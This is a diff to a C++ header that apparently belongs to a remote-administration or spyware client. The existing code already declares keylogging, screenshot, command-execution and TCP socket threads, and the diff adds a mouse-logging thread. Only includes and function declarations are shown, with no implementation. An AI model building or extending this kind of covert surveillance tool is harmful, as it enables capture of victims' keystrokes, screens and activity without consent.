@@ -17,6 +17,7 @@
 #include <cstdio>
 #include <stdio.h>
 #include <time.h>
+#include <set>
 #include <queue>
 #include <vector>
 
@@ -24,6 +25,7 @@
 #include "thread.h"
 #include "tcpsocket.h"
 #include "keylog.h"
+#include "mouselog.h"
 #include "screen.h"
 #include "sysexec.h"
 #include "fs.h"
@@ -41,5 +43,7 @@ DWORD _stdcall socket_send_thread(LPVOID lpParam);
 DWORD _stdcall socket_receive_thread(LPVOID lpParam);
 
 DWORD _stdcall keylog_thread(LPVOID lpParam);
+DWORD _stdcall mouselog_thread(LPVOID lpParam);
+
 DWORD _stdcall screenshot_thread(LPVOID lpParam);
 DWORD _stdcall sysexec_thread(LPVOID lpParam);
